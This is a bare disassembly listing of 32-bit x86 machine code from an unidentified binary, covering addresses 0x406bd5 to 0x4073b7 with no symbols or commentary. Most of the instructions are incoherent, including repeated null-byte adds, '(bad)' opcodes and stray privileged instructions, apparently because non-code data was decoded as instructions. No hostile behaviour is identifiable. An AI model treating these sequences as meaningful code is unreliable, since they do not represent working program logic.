  406bd5:	and    DWORD PTR [edx-0x65fdeed1],edi
  406bdb:	and    ebx,eax
  406bdd:	das    
  406bde:	sbb    al,0x0
  406be0:	xor    cl,BYTE PTR [ecx]
  406be2:	and    al,0x2f
  406be4:	sub    al,0x0
  406be6:	xor    cl,BYTE PTR [ecx]
  406be8:	and    al,0x2f
  406bea:	push   esp
  406beb:	add    BYTE PTR [esi+0x5c010a03],dh
  406bf1:	add    BYTE PTR [esi+0x5c010a03],dh
  406bf7:	add    BYTE PTR [ecx+ecx*1],bh
  406bfa:	push   ds
  406bfb:	das    
  406bfc:	pop    esp
  406bfd:	add    BYTE PTR [edx],dh
  406bff:	or     ecx,edx
  406c01:	mov    eax,cs:0xfa21ae01
  406c07:	das    
  406c08:	add    BYTE PTR fs:[esi+0x542f2403],dh
  406c0f:	add    BYTE PTR [edx],dh
  406c11:	or     ecx,edx
  406c13:	cs sbb al,0x0
  406c16:	push   cs
  406c17:	or     BYTE PTR [ecx+0x1],dh
  406c1a:	sbb    al,0x0
  406c1c:	jo     0x406c27
  406c1e:	pop    es
  406c1f:	xor    BYTE PTR [eax+eax*1+0x33],ch
  406c23:	and    BYTE PTR [ebx+0x2f],bl
  406c26:	je     0x406c28
  406c28:	jmp    DWORD PTR [eax]
  406c2a:	sbb    DWORD PTR [edi],ebp
  406c2c:	push   esp
  406c2d:	add    BYTE PTR [eax+0x9],dh
  406c30:	sub    dh,BYTE PTR [eax]
  406c32:	jl     0x406c34
  406c34:	xor    esp,DWORD PTR [eax]
  406c36:	pop    ebx
  406c37:	das    
  406c38:	add    BYTE PTR fs:[ecx],cl
  406c3b:	and    DWORD PTR [ebx+0x2f],ebx
  406c3e:	jl     0x406c40
  406c40:	pusha  
  406c41:	and    BYTE PTR [ebp+0x0],al
  406c44:	and    DWORD PTR [edx],eax
  406c46:	mov    ebp,0xa1021b21
  406c4b:	add    DWORD PTR [esi+0x64308803],esi
  406c51:	add    bh,bh
  406c53:	and    BYTE PTR [ecx],bl
  406c55:	das    
  406c56:	and    DWORD PTR [edx],eax
  406c58:	ret    
  406c59:	and    DWORD PTR [ebx],ebx
  406c5b:	add    ah,BYTE PTR [ecx]
  406c5d:	add    al,bl
  406c5f:	and    DWORD PTR [edi],edx
  406c61:	add    ch,BYTE PTR [ecx]
  406c63:	add    dl,dh
  406c65:	and    DWORD PTR [ebp-0x7fdd6d0],edi
  406c6b:	and    ebx,eax
  406c6d:	xor    BYTE PTR [ecx],dh
  406c6f:	add    al,bh
  406c71:	add    eax,DWORD PTR [ecx+0x0]
  406c74:	xor    DWORD PTR [edx],eax
  406c76:	pop    edx
  406c77:	bswap  edi
  406c79:	xor    BYTE PTR [ecx],ah
  406c7b:	add    al,BYTE PTR [eax]
  406c7d:	and    cl,BYTE PTR [esi+0x1]
  406c80:	inc    ecx
  406c81:	add    dh,BYTE PTR [esi-0x7bfe23fd]
  406c87:	add    BYTE PTR [esi+0x49010a03],dh
  406c8d:	add    ch,BYTE PTR [edx+eiz*1]
  406c90:	dec    ecx
  406c91:	xor    DWORD PTR [eax+eax*1+0x2ed10932],eax
  406c98:	test   BYTE PTR [eax],al
  406c9a:	push   cs
  406c9b:	or     BYTE PTR [ecx+0x1],dh
  406c9e:	test   BYTE PTR [eax],al
  406ca0:	sbb    BYTE PTR [eax],cl
  406ca2:	pop    ecx
  406ca3:	xor    ecx,ebx
  406ca5:	add    DWORD PTR [esi-0x7bfe74fd],esi
  406cab:	add    BYTE PTR [eax+0x9],dh
  406cae:	sub    dh,BYTE PTR [eax]
  406cb0:	mov    WORD PTR [eax],es
  406cb2:	xor    esp,DWORD PTR [eax]
  406cb4:	pop    ebx
  406cb5:	das    
  406cb6:	mov    WORD PTR [eax],es
  406cb8:	pusha  
  406cb9:	and    BYTE PTR [ebp+0x0],al
  406cbc:	push   ecx
  406cbd:	add    dh,BYTE PTR [esi-0x6bce76fd]
  406cc3:	add    BYTE PTR [edx+0x22],bl
  406cc6:	sub    al,0x2f
  406cc8:	popa   
  406cc9:	add    dh,BYTE PTR [esi-0x63fef5fd]
  406ccf:	add    BYTE PTR [esi-0x5bfef5fd],dh
  406cd5:	add    BYTE PTR [esi+0x6931ac03],dh
  406cdb:	add    cl,al
  406cdd:	and    dh,BYTE PTR [edx-0x31fd96cf]
  406ce3:	and    cl,ch
  406ce5:	xor    DWORD PTR [ecx+0x2],esi
  406ce8:	in     eax,0x22
  406cea:	pop    ebx
  406ceb:	cs jns 0x406cf0
  406cee:	icebp  
  406cef:	and    bl,BYTE PTR [eax]
  406cf1:	imul   eax,DWORD PTR cs:[edx],0x31df093c
  406cf8:	pushf  
  406cf9:	add    BYTE PTR [edx],dh
  406cfb:	or     ecx,edx
  406cfd:	add    DWORD PTR cs:[edx],0x2e5b22e5
  406d04:	add    DWORD PTR [edx],0x31f32315
  406d0a:	pushf  
  406d0b:	add    BYTE PTR [esi],bl
  406d0d:	and    edi,ebp
  406d0f:	xor    DWORD PTR [eax+eax*1+0x10a0936],ebx
  406d16:	pushf  
  406d17:	add    BYTE PTR [ecx+ecx*1],bh
  406d1a:	push   ds
  406d1b:	das    
  406d1c:	pushf  
  406d1d:	add    BYTE PTR [ebp+0x9],al
  406d20:	or     esi,DWORD PTR [edx]
  406d22:	pushf  
  406d23:	add    BYTE PTR [esi],cl
  406d25:	or     BYTE PTR [ecx+0x1],dh
  406d28:	or     al,0x0
  406d2a:	dec    esp
  406d2b:	or     DWORD PTR [ebp+0x0],eax
  406d2e:	pushf  
  406d2f:	add    BYTE PTR [ebx+0x9],bl
  406d32:	push   ds
  406d33:	das    
  406d34:	pushf  
  406d35:	add    BYTE PTR [eax+0x9],dh
  406d38:	sub    dh,BYTE PTR [eax]
  406d3a:	pushf  
  406d3b:	add    BYTE PTR [eax],bl
  406d3d:	or     BYTE PTR [ecx+0x31],bl
  406d40:	xchg   ecx,eax
  406d41:	add    dh,BYTE PTR [esi-0x66fef5fd]
  406d47:	add    dl,BYTE PTR [edx+0x23]
  406d4a:	sbb    dh,BYTE PTR [edx]
  406d4c:	loope  0x406d4e
  406d4e:	and    ecx,DWORD PTR fs:[esi+ebp*1]
  406d52:	loope  0x406d54
  406d54:	jns    0x406d79
  406d56:	and    BYTE PTR [edx],dh
  406d58:	cdq    
  406d59:	add    dl,BYTE PTR [ebp+0x21322523]
  406d5f:	add    dh,BYTE PTR [ebx-0x5ecdd4dd]
  406d65:	add    al,dh
  406d67:	and    esi,DWORD PTR [ecx+0x1]
  406d6a:	cdq    
  406d6b:	add    ah,BYTE PTR [ebx+eiz*1+0x20]
  406d6f:	xor    ah,cl
  406d71:	add    ah,bl
  406d73:	and    esi,DWORD PTR [ecx]
  406d75:	xor    ch,BYTE PTR [ecx+0x7123e902]
  406d7b:	add    DWORD PTR [ecx+0x7123f902],ebp
  406d81:	add    ecx,esp
  406d83:	add    BYTE PTR [esi+0x4101dc03],dh
  406d89:	add    BYTE PTR [edx],cl
  406d8b:	and    al,0x41
  406d8d:	add    BYTE PTR [ecx],ah
  406d8f:	add    dl,BYTE PTR [esi]
  406d91:	and    al,0x17
  406d93:	add    dh,BYTE PTR [ecx+0x4503b602]
  406d99:	xor    dh,BYTE PTR [ecx+0x27243602]
  406d9f:	add    DWORD PTR [ecx+0x4b0f6602],esi
  406da5:	xor    bh,BYTE PTR [ecx+0xa03b602]
  406dab:	add    ecx,eax
  406dad:	add    dh,BYTE PTR [esi-0x36fef5fd]
  406db3:	add    ch,BYTE PTR [esp+0x2d93251]
  406dba:	jecxz  0x406de0
  406dbc:	push   edi
  406dbd:	xor    bh,BYTE PTR [ecx+0x5e24f302]
  406dc3:	xor    ch,cl
  406dc5:	add    bh,BYTE PTR [edi-0x4ecd9afb]
  406dcb:	add    cl,BYTE PTR ds:0xb4326f25
  406dd1:	add    BYTE PTR [eax+0x9],dh
  406dd4:	cwde   
  406dd5:	xor    bh,BYTE PTR [eax+eax*1+0x2f5b2033]
  406ddc:	rol    DWORD PTR [eax],0x1a
  406ddf:	and    eax,0x22132a8
  406de4:	daa    
  406de5:	and    eax,0x22132ad
  406dea:	cmp    esp,DWORD PTR ds:0xc132c3
  406df0:	push   ebp
  406df1:	and    eax,0xc10041
  406df6:	push   0xc1017125
  406dfb:	add    BYTE PTR [ecx+0x25],dh
  406dfe:	jno    0x406e01
  406e00:	stc    
  406e01:	add    cl,BYTE PTR [edx]
  406e03:	and    al,0x41
  406e05:	add    cl,al
  406e07:	add    BYTE PTR [eax-0x1efe8eeb],dl
  406e0d:	add    BYTE PTR [ebp-0x5ed1f3db],al
  406e13:	add    DWORD PTR [eax-0x5ecd31db],ebp
  406e19:	add    DWORD PTR [edi+0x932e325],ebp
  406e1f:	add    eax,ebx
  406e21:	and    eax,0x1a1014a
  406e26:	scas   al,BYTE PTR es:[edi]
  406e27:	and    ecx,ebp
  406e29:	xor    al,BYTE PTR [ecx+0x0]
  406e2c:	mov    dh,0x3
  406e2e:	or     al,BYTE PTR [ecx]
  406e30:	xchg   esp,eax
  406e31:	add    BYTE PTR [esi-0x2ece53fd],dh
  406e37:	add    dh,dl
  406e39:	and    eax,0xd132fe
  406e3e:	mov    dh,0x3
  406e40:	push   es
  406e41:	xor    ebx,DWORD PTR [ecx]
  406e43:	add    esi,DWORD PTR [esi+0x19330e03]
  406e49:	add    ebx,DWORD PTR [ebx]
  406e4b:	es adc al,0x33
  406e4e:	and    DWORD PTR [ebx],eax
  406e50:	xchg   DWORD PTR [esi],esp
  406e52:	xor    ebp,DWORD PTR cs:[ecx]
  406e55:	add    ebp,DWORD PTR [ecx]
  406e57:	and    BYTE PTR [ebx+esi*1],dh
  406e5a:	jns    0x406e5e
  406e5c:	xchg   edi,eax
  406e5d:	sbb    BYTE PTR es:[esi],ch
  406e60:	jns    0x406e64
  406e62:	test   al,0x26
  406e64:	sbb    BYTE PTR [esi],ch
  406e66:	xor    DWORD PTR [ebx],eax
  406e68:	mov    dh,0x3
  406e6a:	fadd   QWORD PTR [ecx]
  406e6c:	cmp    DWORD PTR [ebx],eax
  406e6e:	mov    dh,0x3
  406e70:	fadd   QWORD PTR [ecx]
  406e72:	inc    ecx
  406e73:	add    esi,DWORD PTR [esi+0x49010a03]
  406e79:	add    esi,DWORD PTR [esi+0x41010a03]
  406e7f:	add    BYTE PTR [esi+0x4901dc03],dh
  406e85:	add    BYTE PTR [esi+0x4901dc03],dh
  406e8b:	add    dh,bl
  406e8d:	add    eax,DWORD PTR [ecx+0x0]
  406e90:	dec    ecx
  406e91:	add    BYTE PTR [edi+eiz*1],dl
  406e94:	fadd   QWORD PTR [ecx]
  406e96:	push   ecx
  406e97:	add    BYTE PTR [esi+0x6901dc03],dh
  406e9d:	add    BYTE PTR [ecx],ch
  406e9f:	daa    
  406ea0:	ret    0xd935
  406ea3:	add    BYTE PTR [esi+0x5135c803],dh
  406ea9:	add    eax,DWORD PTR [edx+0x27]
  406eac:	shl    BYTE PTR ds:0x1a7f00d9,1
  406eb2:	out    0x35,eax
  406eb4:	push   cs
  406eb5:	add    BYTE PTR [eax],ah
  406eb7:	add    BYTE PTR [ecx+0x0],dl
  406eba:	push   cs
  406ebb:	add    BYTE PTR [eax+eax*1],ah
  406ebe:	pop    eax
  406ebf:	add    BYTE PTR [esi],cl
  406ec1:	add    BYTE PTR [eax],bh
  406ec3:	add    dh,dl
  406ec5:	add    BYTE PTR [esi],cl
  406ec7:	add    BYTE PTR [eax+eax*1],bh
  406eca:	in     eax,0x0
  406ecc:	or     BYTE PTR [eax],al
  406ece:	je     0x406ed0
  406ed0:	test   eax,0x78000801
  406ed5:	add    BYTE PTR [esi-0x77fff7ff],ch
  406edb:	add    BYTE PTR [ecx-0x73fff7ff],ch
  406ee1:	add    BYTE PTR [esi-0x5bfff7ff],ch
  406ee7:	add    dh,bh
  406ee9:	add    DWORD PTR [eax],ecx
  406eeb:	add    BYTE PTR [eax+0x8020300],ch
  406ef1:	add    BYTE PTR [eax+eax*1+0x80208],ch
  406ef8:	rol    BYTE PTR [eax],0x70
  406efb:	add    cl,BYTE PTR [eax]
  406efd:	add    al,cl
  406eff:	add    BYTE PTR [ecx+0x2],bh
  406f02:	or     BYTE PTR [eax],al
  406f04:	int3   
  406f05:	add    BYTE PTR [esi+0x2],bh
  406f08:	or     BYTE PTR [eax],al
  406f0a:	rol    BYTE PTR [eax],1
  406f0c:	add    DWORD PTR [edx],0x8
  406f0f:	add    ah,dl
  406f11:	add    BYTE PTR [eax-0x27fff7fe],cl
  406f17:	add    BYTE PTR [ebp-0x23fff7fe],cl
  406f1d:	add    BYTE PTR [edx-0x1ffff7fe],dl
  406f23:	add    BYTE PTR [edi-0x1bfff7fe],dl
  406f29:	add    BYTE PTR [edx+eax*1+0xe80008],bl
  406f30:	mov    eax,ds:0xec000802
  406f35:	add    BYTE PTR [esi-0xffff7fe],ah
  406f3b:	add    BYTE PTR [ebx-0xbfff7fe],ch
  406f41:	add    BYTE PTR [eax-0x7fff7fe],dh
  406f47:	add    BYTE PTR [ebp-0x3fff7fe],dh
  406f4d:	add    BYTE PTR [edx+0x802],bh
  406f53:	add    DWORD PTR [edi+0x4000802],edi
  406f59:	add    esp,eax
  406f5b:	add    cl,BYTE PTR [eax]
  406f5d:	add    BYTE PTR [eax],cl
  406f5f:	add    ecx,ecx
  406f61:	add    cl,BYTE PTR [eax]
  406f63:	add    BYTE PTR [ecx+eax*1],cl
  406f66:	into   
  406f67:	add    cl,BYTE PTR [eax]
  406f69:	add    BYTE PTR [eax],dl
  406f6b:	add    ebx,edx
  406f6d:	add    cl,BYTE PTR [eax]
  406f6f:	add    BYTE PTR [ecx+eax*1],dl
  406f72:	fadd   DWORD PTR [edx]
  406f74:	or     BYTE PTR [eax],al
  406f76:	sbb    BYTE PTR [ecx],al
  406f78:	fld    QWORD PTR [edx]
  406f7a:	or     BYTE PTR [eax],al
  406f7c:	sbb    al,0x1
  406f7e:	loop   0x406f82
  406f80:	or     BYTE PTR [eax],al
  406f82:	and    BYTE PTR [ecx],al
  406f84:	out    0x2,eax
  406f86:	or     BYTE PTR [eax],al
  406f88:	and    al,0x1
  406f8a:	in     al,dx
  406f8b:	add    cl,BYTE PTR [eax]
  406f8d:	add    BYTE PTR [eax],ch
  406f8f:	add    ecx,esi
  406f91:	add    cl,BYTE PTR [eax]
  406f93:	add    BYTE PTR [ecx+eax*1],ch
  406f96:	test   BYTE PTR [edx],0xe
  406f99:	add    BYTE PTR [eax],dh
  406f9b:	add    ebx,edi
  406f9d:	add    cl,BYTE PTR [esi]
  406f9f:	add    BYTE PTR [ecx+eax*1],dh
  406fa2:	push   es
  406fa3:	add    ecx,DWORD PTR [esi]
  406fa5:	add    BYTE PTR [eax],bh
  406fa7:	add    DWORD PTR ds:0x3c000e03,ecx
  406fad:	add    DWORD PTR [ebx+eax*1],edx
  406fb0:	push   cs
  406fb1:	add    BYTE PTR [eax+0x1],al
  406fb4:	pop    ds
  406fb5:	add    ecx,DWORD PTR [esi]
  406fb7:	add    BYTE PTR [ecx+eax*1+0x24],al
  406fbb:	add    ecx,DWORD PTR [esi]
  406fbd:	add    BYTE PTR [eax+0x1],cl
  406fc0:	sub    eax,DWORD PTR [ebx]
  406fc2:	push   cs
  406fc3:	add    BYTE PTR [ecx+eax*1+0x3a],cl
  406fc7:	add    ecx,DWORD PTR [eax]
  406fc9:	add    BYTE PTR [ecx+eax*1-0x57],dh
  406fcd:	add    DWORD PTR [eax],ecx
  406fcf:	add    BYTE PTR [eax+0x1],bh
  406fd2:	scas   al,BYTE PTR es:[edi]
  406fd3:	add    DWORD PTR [esi],ecx
  406fd5:	add    BYTE PTR [eax+0xe03e801],al
  406fdb:	add    BYTE PTR [ecx+eax*1+0xe03f7],al
  406fe2:	mov    BYTE PTR [ecx],al
  406fe4:	test   DWORD PTR [ebx],0x18c000e
  406fea:	push   es
  406feb:	add    al,0xe
  406fed:	add    BYTE PTR [eax+0xe040601],dl
  406ff3:	add    BYTE PTR [ecx+eax*1+0xe0406],dl
  406ffa:	cwde   
  406ffb:	add    DWORD PTR ds:0x9c000e04,esp
  407001:	add    edi,esi
  407003:	add    ecx,DWORD PTR [esi]
  407005:	add    BYTE PTR [eax+0x8048201],ah
  40700b:	add    BYTE PTR [ecx+eax*1+0xe049f],ah
  407012:	test   al,0x1
  407014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407015:	add    al,0xe
  407017:	add    BYTE PTR [ecx+eax*1+0xe04a4],ch
  40701e:	mov    al,0x1
  407020:	lds    eax,FWORD PTR [esi+ecx*1]
  407023:	add    BYTE PTR [ecx+eax*1+0xe0506],dh
  40702a:	mov    eax,0xe059e01
  40702f:	add    BYTE PTR [ecx+eax*1+0xe063c],bh
  407036:	rol    BYTE PTR [ecx],0xf4
  407039:	push   es
  40703a:	push   cs
  40703b:	add    ah,al
  40703d:	add    DWORD PTR [eax-0x37fff1f9],ecx
  407043:	add    DWORD PTR [esi],edi
  407045:	or     BYTE PTR [esi],cl
  407047:	add    ah,cl
  407049:	add    esi,ebp
  40704b:	or     BYTE PTR [esi],cl
  40704d:	add    al,dl
  40704f:	add    DWORD PTR [edx-0x2bfff1f7],ecx
  407055:	add    DWORD PTR [edx-0x27fff1f7],ecx
  40705b:	add    DWORD PTR [ebx-0x23fff1f7],ebp
  407061:	add    DWORD PTR ds:0xe0000e0c,ebp
  407067:	add    DWORD PTR ds:0xe4000e0c,ebp
  40706d:	add    DWORD PTR [esi+0xc],ecx
  407070:	push   cs
  407071:	add    al,ch
  407073:	add    eax,edx
  407075:	push   cs
  407076:	push   cs
  407077:	add    ah,ch
  407079:	add    DWORD PTR [edx-0xffff1f1],esp
  40707f:	add    DWORD PTR [edx+0x10],edx
  407082:	push   cs
  407083:	add    ah,dh
  407085:	add    DWORD PTR [edx],edx
  407087:	adc    DWORD PTR [esi],ecx
  407089:	add    al,bh
  40708b:	add    DWORD PTR [ecx+edx*1+0x1fc000e],edi
  407092:	pop    esi
  407093:	adc    cl,BYTE PTR [esi]
  407095:	add    BYTE PTR [eax],al
  407097:	add    dl,BYTE PTR [esi]
  407099:	adc    ecx,DWORD PTR [esi]
  40709b:	add    BYTE PTR [edx+eax*1],al
  40709e:	enter  0xe13,0x0
  4070a2:	or     BYTE PTR [edx],al
  4070a4:	ins    BYTE PTR es:[edi],dx
  4070a5:	adc    al,0xe
  4070a7:	add    BYTE PTR [edx+eax*1],cl
  4070aa:	es adc eax,0x210000e
  4070b0:	rcl    BYTE PTR ds:0x214000e,1
  4070b6:	js     0x4070ce
  4070b8:	push   cs
  4070b9:	add    BYTE PTR [eax],bl
  4070bb:	add    bl,BYTE PTR [eax+0x17]
  4070be:	push   cs
  4070bf:	add    BYTE PTR [edx+eax*1],bl
  4070c2:	(bad)  
  4070c3:	pop    ss
  4070c4:	push   cs
  4070c5:	add    BYTE PTR [eax],ah
  4070c7:	add    dh,BYTE PTR [eax+0x24000e18]
  4070cd:	add    cl,BYTE PTR [ecx+ebx*1+0xe]
  4070d1:	add    BYTE PTR [eax],ch
  4070d3:	add    al,BYTE PTR [edx]
  4070d5:	sbb    cl,BYTE PTR [esi]
  4070d7:	add    BYTE PTR [edx+eax*1],ch
  4070da:	mov    dh,0x1a
  4070dc:	push   cs
  4070dd:	add    BYTE PTR [eax],dh
  4070df:	add    bh,BYTE PTR [eax+0x1b]
  4070e2:	push   cs
  4070e3:	add    BYTE PTR [edx+eax*1],dh
  4070e6:	xor    BYTE PTR [esi+ecx*1],bl
  4070e9:	add    BYTE PTR [eax],bh
  4070eb:	add    ah,dl
  4070ed:	sbb    al,0xe
  4070ef:	add    BYTE PTR [edx+eax*1],bh
  4070f2:	mov    ds:0x40000e1d,al
  4070f7:	add    cl,BYTE PTR [esi+ebx*1+0xe]
  4070fb:	add    BYTE PTR [edx+eax*1+0xe],al
  4070ff:	pop    ds
  407100:	push   cs
  407101:	add    BYTE PTR [eax+0x2],cl
  407104:	mov    edx,0x4c000e1f
  407109:	add    ch,BYTE PTR [eax+0x20]
  40710c:	push   cs
  40710d:	add    BYTE PTR [eax+0x2],dl
  407110:	sbb    al,0x21
  407112:	push   cs
  407113:	add    BYTE PTR [edx+eax*1-0x14],dl
  407117:	and    DWORD PTR [esi],ecx
  407119:	add    BYTE PTR [eax+0x2],bl
  40711c:	call   0xbb02:0x5c000e22
  407123:	and    cl,BYTE PTR [esi]
  407125:	add    BYTE PTR [eax+0x2],ah
  407128:	outs   dx,DWORD PTR ds:[esi]
  407129:	and    ecx,DWORD PTR [esi]
  40712b:	add    BYTE PTR [edx+eax*1+0x1f],ah
  40712f:	and    al,0xe
  407131:	add    BYTE PTR [eax+0x2],ch
  407134:	(bad)  [esi+ecx*1]
  407137:	add    BYTE PTR [edx+eax*1-0x67],ch
  40713b:	and    eax,0x270000e
  407140:	push   edi
  407141:	es push cs
  407143:	add    BYTE PTR [eax+0x2],bh
  407146:	add    DWORD PTR [edi],esp
  407148:	push   cs
  407149:	add    BYTE PTR [edx+eax*1+0x20],bh
  40714d:	daa    
  40714e:	push   cs
  40714f:	add    BYTE PTR [eax+0xe273502],al
  407155:	add    BYTE PTR [edx+eax*1+0xe2762],al
  40715c:	mov    BYTE PTR [edx],al
  40715e:	xchg   DWORD PTR [edi],esp
  407160:	push   cs
  407161:	add    BYTE PTR [edx+eax*1+0xe27b2],cl
  407168:	nop
  407169:	add    dl,bl
  40716b:	daa    
  40716c:	push   cs
  40716d:	add    BYTE PTR [edx+eax*1+0xe280c],dl
  407174:	cwde   
  407175:	add    dh,BYTE PTR [ebx]
  407177:	sub    BYTE PTR [esi],cl
  407179:	add    BYTE PTR [edx+eax*1+0xe285c],bl
  407180:	mov    al,ds:0xe288902
  407185:	add    BYTE PTR [edx+eax*1+0xe28c6],ah
  40718c:	test   al,0x2
  40718e:	add    ebp,DWORD PTR [ecx]
  407190:	push   cs
  407191:	add    BYTE PTR [edx+eax*1+0xe2938],ch
  407198:	mov    al,0x2
  40719a:	sub    DWORD PTR gs:[esi],ecx
  40719d:	add    BYTE PTR [edx+eax*1+0xe2988],dh
  4071a4:	mov    eax,0xe29ad02
  4071a9:	add    BYTE PTR [edx+eax*1+0xe29e2],bh
  4071b0:	rol    BYTE PTR [edx],0x5
  4071b3:	sub    cl,BYTE PTR [esi]
  4071b5:	add    ah,al
  4071b7:	add    ch,BYTE PTR [eax]
  4071b9:	sub    cl,BYTE PTR [esi]
  4071bb:	add    al,cl
  4071bd:	add    al,BYTE PTR [ecx+0x2a]
  4071c0:	push   cs
  4071c1:	add    ah,cl
  4071c3:	add    dl,BYTE PTR [edx+0x2a]
  4071c6:	push   cs
  4071c7:	add    al,dl
  4071c9:	add    bh,BYTE PTR [ecx+0x2a]
  4071cc:	push   cs
  4071cd:	add    ah,dl
  4071cf:	add    cl,BYTE PTR [edx-0x27fff1d6]
  4071d5:	add    dh,BYTE PTR [ecx-0x23fff1d6]
  4071db:	add    al,dl
  4071dd:	sub    cl,BYTE PTR [esi]
  4071df:	add    al,ah
  4071e1:	add    ch,cl
  4071e3:	sub    cl,BYTE PTR [esi]
  4071e5:	add    ah,ah
  4071e7:	add    al,BYTE PTR [eax]
  4071e9:	sub    ecx,DWORD PTR [esi]
  4071eb:	add    al,ch
  4071ed:	add    ch,BYTE PTR [ecx]
  4071ef:	sub    ecx,DWORD PTR [esi]
  4071f1:	add    ah,ch
  4071f3:	add    cl,BYTE PTR [esi+0x2b]
  4071f6:	push   cs
  4071f7:	add    al,dh
  4071f9:	add    bh,BYTE PTR [ecx+0x2b]
  4071fc:	push   cs
  4071fd:	add    ah,dh
  4071ff:	add    bl,BYTE PTR [ebx+ebp*1+0x2f8000e]
  407206:	lds    ebp,FWORD PTR [ebx]
  407208:	push   cs
  407209:	add    ah,bh
  40720b:	add    ah,ah
  40720d:	sub    ecx,DWORD PTR [esi]
  40720f:	add    BYTE PTR [eax],al
  407211:	add    ebx,DWORD PTR ds:0x4000e2c
  407217:	add    ecx,DWORD PTR [edx+0x2c]
  40721a:	push   cs
  40721b:	add    BYTE PTR [eax],cl
  40721d:	add    ebp,DWORD PTR [ecx+0x2c]
  407220:	push   cs
  407221:	add    BYTE PTR [ebx+eax*1],cl
  407224:	mov    al,ds:0x10000e2c
  407229:	add    ebx,ebx
  40722b:	sub    al,0xe
  40722d:	add    BYTE PTR [ebx+eax*1],dl
  407230:	push   ss
  407231:	sub    eax,0x318000e
  407236:	sub    eax,0x1c000e2d
  40723b:	add    ebx,DWORD PTR [eax+0x2d]
  40723e:	push   cs
  40723f:	add    BYTE PTR [eax],ah
  407241:	add    ecx,DWORD PTR [ecx+0x24000e2d]
  407247:	add    esp,DWORD PTR [edx-0x5cffd1d3]
  40724d:	add    dh,ah
  40724f:	ss add BYTE PTR cs:[ebx],bh
  407253:	add    BYTE PTR [edx],al
  407255:	ss add BYTE PTR cs:[ebx+0x0],al
  40725a:	add    dh,BYTE PTR [esi]
  40725c:	add    BYTE PTR cs:[ebx+0x2e36b300],dl
  407263:	add    BYTE PTR [ebx+0x2e36ef00],ch
  407269:	add    BYTE PTR [ebx],ah
  40726b:	add    dh,dh
  40726d:	xor    eax,0x2b002e
  407272:	cld    
  407273:	xor    eax,0x33002e
  407278:	add    dh,BYTE PTR [esi]
  40727a:	add    BYTE PTR cs:[ebx+0x2e36dd00],bl
  407281:	add    BYTE PTR [ebx+0x0],cl
  407284:	pop    ss
  407285:	ss add BYTE PTR cs:[ebx+0x0],dl
  40728a:	xor    dh,BYTE PTR [esi]
  40728c:	add    BYTE PTR cs:[ebx+0x0],bl
  407290:	push   edx
  407291:	ss add BYTE PTR cs:[ebx+0x0],ch
  407296:	xchg   DWORD PTR [esi],esi
  407298:	add    BYTE PTR cs:[ebx+0x0],dh
  40729c:	xchg   DWORD PTR [esi],esi
  40729e:	add    BYTE PTR cs:[ebx+0x0],bh
  4072a2:	fwait
  4072a3:	ss add BYTE PTR cs:[ebx+0x2e36a800],al
  4072ab:	add    BYTE PTR [ebx+0x4335fc00],cl
  4072b1:	add    BYTE PTR [ebx-0x3cd1bf00],dh
  4072b7:	add    BYTE PTR [ebx-0x1ccee200],dh
  4072bd:	add    BYTE PTR [ebx],ch
  4072bf:	add    edi,DWORD PTR [eax]
  4072c1:	xor    DWORD PTR [ebx+0x38032b01],eax
  4072c7:	xor    DWORD PTR [ecx-0x2affe5fe],ebp
  4072cd:	xor    cl,cl
  4072cf:	add    bl,BYTE PTR [edx]
  4072d1:	add    al,bh
  4072d3:	xor    BYTE PTR [ebx+0x3],ah
  4072d6:	mov    bl,0x0
  4072d8:	mov    ecx,0xb3038335
  4072dd:	add    BYTE PTR [ecx+0xa04e935],bh
  4072e3:	add    BYTE PTR [edx],bh
  4072e5:	xor    eax,DWORD PTR [ecx]
  4072e7:	add    eax,0x1ae038b
  4072ec:	or     DWORD PTR ds:0x336d000a,eax
  4072f2:	sub    DWORD PTR ds:0x341b01aa,eax
  4072f8:	sub    DWORD PTR ds:0x33a9000a,eax
  4072fe:	sub    DWORD PTR ds:0x33ba01aa,eax
  407304:	dec    ecx
  407305:	add    eax,0x348801b2
  40730a:	dec    ecx
  40730b:	add    eax,0x34e901b2
  407310:	dec    ecx
  407311:	add    eax,0x3478000a
  407316:	imul   eax,DWORD PTR ds:0x354a001a,0x120589
  407320:	xor    DWORD PTR ds:0x38b0a60,0xffffffae
  407327:	add    DWORD PTR [eax-0x51fbd4f6],eax
  40732d:	add    DWORD PTR [esp+edx*1],eax
  407330:	sbb    eax,DWORD PTR [eax]
  407332:	scas   al,BYTE PTR es:[edi]
  407333:	add    DWORD PTR [esi+ebp*1+0x7b],esi
  407337:	mov    cs:0xd72ec12e,al
  40733d:	cs pusha 
  40733f:	das    
  407340:	mov    ebp,DWORD PTR [edi]
  407342:	mov    ds:0x402fcb2f,eax
  407347:	xor    BYTE PTR [esi-0x4ffea0d0],cl
  40734d:	xor    BYTE PTR [ecx+0x4e30c930],bh
  407353:	xor    DWORD PTR [edi+0x31],ebx
  407356:	outs   dx,BYTE PTR ds:[esi]
  407357:	xor    edx,ebx
  407359:	xor    DWORD PTR [edi],eax
  40735b:	xor    dh,BYTE PTR [edi]
  40735d:	xor    bh,BYTE PTR [edx+esi*1-0x4d]
  407361:	xor    cl,al
  407363:	xor    bl,al
  407365:	xor    dh,al
  407367:	xor    bh,al
  407369:	xor    bl,BYTE PTR [ecx]
  40736b:	xor    ebx,DWORD PTR [esi]
  40736d:	xor    esi,DWORD PTR [ebp+esi*1+0x35ee35e2]
  407374:	add    al,BYTE PTR [eax]
  407376:	add    DWORD PTR [eax],eax
  407378:	add    eax,DWORD PTR [eax]
  40737a:	or     BYTE PTR [eax],al
  40737c:	add    al,0x0
  40737e:	adc    eax,DWORD PTR [eax]
  407380:	add    eax,0x6001400
  407385:	add    BYTE PTR [edi],dl
  407387:	add    BYTE PTR [edi],al
  407389:	add    BYTE PTR [edx],bl
  40738b:	add    BYTE PTR [eax],cl
  40738d:	add    BYTE PTR [esi],bl
  40738f:	add    BYTE PTR [edx],cl
  407391:	add    BYTE PTR [ecx],ah
  407393:	add    BYTE PTR [eax+eax*1],cl
  407396:	and    eax,DWORD PTR [eax]
  407398:	adc    DWORD PTR [eax],eax
  40739a:	add    BYTE PTR es:[ebx],dl
  40739d:	add    BYTE PTR ds:0x45001500,ch
  4073a3:	add    BYTE PTR [ebx],bl
  4073a5:	add    BYTE PTR [esi+0x0],al
  4073a8:	sbb    eax,0x4700
  4073ad:	add    BYTE PTR [ecx],bh
  4073af:	add    al,0x49
  4073b1:	add    BYTE PTR [eax],al
  4073b3:	add    BYTE PTR [esi],bh
  4073b5:	add    al,0x49
  4073b7:	add    BYTE PTR [eax],al
